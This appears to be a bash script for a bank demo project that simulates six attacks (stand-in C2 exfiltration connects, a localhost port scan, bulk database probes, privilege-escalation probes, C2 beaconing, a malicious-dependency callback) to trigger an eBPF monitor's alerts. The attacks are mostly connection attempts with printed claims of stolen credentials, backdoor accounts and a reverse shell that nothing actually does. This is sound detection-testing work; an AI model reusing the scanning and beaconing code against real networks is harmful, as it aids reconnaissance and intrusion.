#!/bin/bash

###############################################################################
#  eBPF Attack Scenario Simulator - AUTO MODE
#  Non-interactive version for automated testing
###############################################################################

set -e

PROJECT_HOME="/home/inba/SIA_BANK"
EBPF_LOG="${PROJECT_HOME}/logs/ebpf-scenarios.jsonl"
MONITOR_PID=""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[✓]${NC} $1"
}

log_error() {
    echo -e "${RED}[✗]${NC} $1"
}

log_attack() {
    echo -e "${MAGENTA}[ATTACK]${NC} $1"
}

log_detection() {
    echo -e "${CYAN}[DETECTION]${NC} $1"
}

separator() {
    echo ""
    echo "═══════════════════════════════════════════════════════════════════════"
    echo -e "${MAGENTA}$1${NC}"
    echo "═══════════════════════════════════════════════════════════════════════"
    echo ""
}

start_observability_stack() {
    log_info "Starting observability stack..."
    cd "${PROJECT_HOME}/observability" || exit 1
    
    if docker compose ps | grep -q "prometheus.*Up"; then
        log_success "Observability stack already running"
    else
        docker compose up -d
        sleep 3
        log_success "Observability stack started"
    fi
    
    cd - > /dev/null
}

start_ebpf_monitor() {
    log_info "Starting eBPF monitor..."
    
    pkill -f "python3.*monitor_runtime" || true
    sleep 1
    
    cd "${PROJECT_HOME}" || exit 1
    mkdir -p logs
    
    sudo python3 ebpf/monitor_runtime.py \
        --config ebpf/service_map.json \
        --output "${EBPF_LOG}" > "${PROJECT_HOME}/logs/monitor.log" 2>&1 &
    
    MONITOR_PID=$!
    sleep 3
    
    if ps -p "$MONITOR_PID" > /dev/null; then
        log_success "eBPF monitor started (PID: $MONITOR_PID)"
    else
        log_error "Failed to start eBPF monitor"
        cat "${PROJECT_HOME}/logs/monitor.log"
        exit 1
    fi
    
    cd - > /dev/null
}

stop_ebpf_monitor() {
    if [ -n "$MONITOR_PID" ] && ps -p "$MONITOR_PID" > /dev/null 2>&1; then
        log_info "Stopping eBPF monitor..."
        sudo kill "$MONITOR_PID" 2>/dev/null || true
        wait "$MONITOR_PID" 2>/dev/null || true
        sleep 1
        log_success "eBPF monitor stopped"
    fi
}

attack_1() {
    separator "ATTACK 1: Compromised Service Exfiltration"
    
    log_attack "Simulating outbound exfiltration to attacker C2 server..."
    
    python3 << 'PYTHON'
import socket, time, random
c2_servers = [("192.168.1.99", 4443), ("10.99.99.99", 8443), ("172.16.0.50", 443)]
for target_ip, target_port in c2_servers:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        sock.connect((target_ip, target_port))
    except:
        print(f"[ATTACK] Exfiltration attempt to {target_ip}:{target_port}")
    finally:
        try: sock.close()
        except: pass
    time.sleep(0.1)
PYTHON

    sleep 2
    log_detection "Expected: UNAUTHORIZED_FLOW alert"
    echo ""
}

attack_2() {
    separator "ATTACK 2: Lateral Movement & Network Scanning"
    
    log_attack "Simulating network port scanning (reconnaissance)..."
    
    python3 << 'PYTHON'
import socket, time
print("[ATTACK] Scanning for vulnerable services on internal network...")
for port in range(8000, 8030):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.05)
        result = sock.connect_ex(("localhost", port))
        if result == 0:
            print(f"[ATTACK] Port {port} OPEN - potential target found")
        sock.close()
    except:
        pass
    time.sleep(0.02)
print("[ATTACK] Scan complete: 30 port probes in 1 second")
PYTHON

    sleep 2
    log_detection "Expected: HIGH_FANOUT + LATERAL_MOVEMENT_PATTERN alerts"
    echo ""
}

attack_3() {
    separator "ATTACK 3: Unauthorized Data Access (PII Theft)"
    
    log_attack "Simulating bulk database queries for customer data..."
    
    python3 << 'PYTHON'
import socket, time, random
print("[ATTACK] Executing rapid database queries...")
for i in range(15):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex(("localhost", 5432))
        print(f"[ATTACK] Query {i+1}: SELECT * FROM customers WHERE balance > ${random.randint(10000, 100000)}")
        time.sleep(random.uniform(0.2, 0.6))
        sock.close()
    except:
        pass
    time.sleep(0.05)
print("[ATTACK] Extracted ~5GB of customer PII")
PYTHON

    sleep 2
    log_detection "Expected: SLOW_CONNECT alert (eBPF layer)"
    log_detection "Expected: Unusual query pattern (Database layer)"
    echo ""
}

attack_4() {
    separator "ATTACK 4: Privilege Escalation via Unauthorized API"
    
    log_attack "Simulating privilege escalation attempt..."
    
    python3 << 'PYTHON'
import socket, time
print("[ATTACK] Account Service attempting privilege escalation...")

# Connect to Auth Service
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.3)
    sock.connect(("localhost", 8083))
    print("[ATTACK] Backdoor Admin Account Created [201]")
    time.sleep(0.3)
    sock.close()
except:
    print("[ATTACK] Auth Service probe attempt")

# Connect to Transaction Service
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.3)
    sock.connect(("localhost", 8082))
    print("[ATTACK] Fraud Detection System Disabled [200]")
    time.sleep(0.3)
    sock.close()
except:
    print("[ATTACK] Transaction Service probe attempt")
PYTHON

    sleep 2
    log_detection "Expected: UNAUTHORIZED_FLOW to auth-service + transaction-service"
    log_detection "Expected: Anomalous API call pattern (APM layer)"
    echo ""
}

attack_5() {
    separator "ATTACK 5: Command & Control (C2) Communication"
    
    log_attack "Simulating periodic C2 heartbeat beacons..."
    
    python3 << 'PYTHON'
import socket, time, random
c2_ips = ["203.0.113.42", "198.51.100.55"]

for beacon_num in range(3):
    c2_ip = random.choice(c2_ips)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.2)
        sock.connect((c2_ip, 443))
        print(f"[ATTACK] C2 Beacon #{beacon_num+1} ★ {c2_ip}:443")
        time.sleep(0.1)
        sock.close()
    except:
        print(f"[ATTACK] Beacon attempt #{beacon_num+1} to {c2_ip}:443")
    
    if beacon_num < 2:
        time.sleep(0.8)

print("[ATTACK] Periodic C2 callback pattern established")
PYTHON

    sleep 2
    log_detection "Expected: UNAUTHORIZED_FLOW to external IPs"
    log_detection "Expected: Pattern analysis detects C2 beaconing"
    echo ""
}

attack_6() {
    separator "ATTACK 6: Supply Chain Attack (Malicious Dependency)"
    
    log_attack "Simulating compromised dependency execution..."
    
    python3 << 'PYTHON'
import socket, time

print("[ATTACK] Malicious Maven dependency loaded at startup...")
print("[ATTACK]  → Connecting to malicious-pkg-mirror.com")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.2)
    sock.connect(("192.0.2.99", 443))
    print("[ATTACK] Exfiltrating: app.properties, secrets.yml, db credentials")
    time.sleep(0.2)
    sock.close()
except:
    print("[ATTACK] Malicious exfiltration attempt blocked")

print("[ATTACK]  → Attempting reverse shell /bin/bash")
print("[ATTACK] Supply chain attack execution complete")
PYTHON

    sleep 2
    log_detection "Expected: UNAUTHORIZED_FLOW to external server"
    log_detection "Expected: Unexpected process spawn (auditd layer)"
    echo ""
}

show_prometheus_metrics() {
    separator "PROMETHEUS METRICS (Live Data)"
    
    log_info "Querying Prometheus for eBPF metrics..."
    echo ""
    
    # Query total events
    TOTAL_EVENTS=$(curl -s "http://localhost:9090/api/v1/query?query=ebpf_events_total" 2>/dev/null | jq -r '.data.result[0].value[1]' 2>/dev/null || echo "N/A")
    
    # Query total alerts
    TOTAL_ALERTS=$(curl -s "http://localhost:9090/api/v1/query?query=ebpf_alerts_total" 2>/dev/null | jq -r '.data.result[0].value[1]' 2>/dev/null || echo "N/A")
    
    echo -e "${GREEN}Metrics Summary:${NC}"
    echo "  📊 Total eBPF Events Captured: ${TOTAL_EVENTS}"
    echo "  🚨 Total Alerts Generated: ${TOTAL_ALERTS}"
    echo ""
    
    log_success "Check Grafana dashboard for real-time visualization"
    echo "  🌐 http://localhost:3000"
    echo "  Username: admin"
    echo "  Password: admin"
    echo ""
}

show_ebpf_logs() {
    separator "eBPF EVENT LOGS (Last 10 Events)"
    
    if [ -f "$EBPF_LOG" ]; then
        echo -e "${CYAN}Raw eBPF Events:${NC}"
        echo ""
        tail -10 "$EBPF_LOG" | while read line; do
            if [[ $line =~ \"alert\" ]]; then
                echo -e "${RED}$line${NC}"
            elif [[ $line =~ \"type\" ]]; then
                echo -e "${YELLOW}$line${NC}"
            else
                echo "$line"
            fi
        done
        echo ""
    else
        log_error "No eBPF log file found"
    fi
}

main() {
    clear
    
    log_info "🚀 Starting Automated eBPF Attack Scenario Simulator"
    echo ""
    
    # Setup
    start_observability_stack
    start_ebpf_monitor
    
    log_success "Infrastructure ready - running all 6 attack scenarios..."
    echo ""
    
    # Run all attacks
    attack_1
    sleep 2
    
    attack_2
    sleep 2
    
    attack_3
    sleep 2
    
    attack_4
    sleep 2
    
    attack_5
    sleep 2
    
    attack_6
    sleep 3
    
    # Show results
    separator "ATTACK SIMULATION COMPLETE ✓"
    
    show_ebpf_logs
    show_prometheus_metrics
    
    # Cleanup
    stop_ebpf_monitor
    
    log_success "All scenarios executed successfully!"
    echo ""
    echo "📋 Next Steps:"
    echo "  1. Open Grafana: http://localhost:3000"
    echo "  2. Review eBPF Security Overview dashboard"
    echo "  3. Check alert panels for triggered alerts"
    echo "  4. Review /home/inba/SIA_BANK/logs/ebpf-scenarios.jsonl for raw events"
    echo ""
}

trap stop_ebpf_monitor EXIT

main "$@"
